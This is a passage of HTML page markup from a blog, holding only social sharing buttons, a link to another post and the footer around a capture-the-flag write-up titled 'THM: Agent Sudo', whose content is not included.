    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f;title=THM%3a%20Agent%20Sudo%20--%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=THM%3a%20Agent%20Sudo%20--%20Write-Up%20https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f&amp;t=THM%3a%20Agent%20Sudo%20--%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=THM%3a%20Agent%20Sudo%20--%20Write-Up&amp;url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>

    
    <div class="pagination">
        

        <div class="pagination__buttons">
            

            
            <span class="button next">
                <a href="https://robscharf.github.io/posts/2022/05/thm-mr-robot-ctf--write-up/">
                    <span class="button__text">THM: Mr Robot CTF -- Write-Up</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>


    

    

  </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2022</span>
            <a href="https://robscharf.github.io//colophon">&#9829;</a>
            
        </div>
    </div>
    
    <div class="footer__inner">
        <div class="footer__content">
            
        </div>
    </div>
</footer>

            
        </div>

        



<script type="text/javascript" src="https://robscharf.github.io/bundle.min.2d3d449fc0ff117f00ac91342a8f76cd5b710411d7a0254dbe75da3234d2f685d6a0c44cff60c414e90b6a149da8e4032c713c25e4e6838e2e3918dc0ad2e81c.js" integrity="sha512-LT1En8D/EX8ArJE0Ko92zVtxBBHXoCVNvnXaMjTS9oXWoMRM/2DEFOkLahSdqOQDLHE8JeTmg44uORjcCtLoHA=="></script>



    </body>
</html>
